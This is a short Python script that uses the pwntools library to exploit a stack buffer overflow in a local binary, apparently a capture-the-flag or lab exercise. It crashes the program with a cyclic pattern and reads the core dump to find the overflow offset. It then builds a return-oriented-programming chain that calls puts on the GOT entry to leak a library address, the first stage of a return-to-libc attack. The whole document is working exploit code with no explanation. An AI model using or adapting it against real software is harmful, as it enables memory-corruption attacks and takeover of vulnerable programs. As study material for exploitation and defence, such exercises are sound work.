from pwn import *
from pprint import pprint

context.binary = "./main.elf"
context.bits = 64
context.arch = "amd64"

elf = ELF("./main.elf")

io = process("./main.elf")
print(io.recvline().decode("utf-8"))

payload = cyclic(345, n=8)
io.sendline(payload)

io.wait_for_close()

core = Core("./core")
fault_address = enhex(pack(core.fault_addr, endian='big'))

vuln_index = cyclic_find(unhex(str(fault_address)), n=8)
print(f"[INFO] - Vulnerable index is : {vuln_index}")

rop = ROP("./main.elf")
rop.call(elf.symbols["puts"], [elf.got["puts"]])

print(f"[INFO] - puts symbols address : {elf.symbols['puts']}")
print(f"[INFO] - puts got address : {elf.got['puts']}")

io = process("./main.elf")
print(io.recvline().decode("utf-8"))

payload = [
    cyclic(vuln_index),
    rop.chain()
]

payload = b"".join(payload)

write("payload2", payload)
io.sendline(payload)


io.wait_for_close()

core = Core("./core")
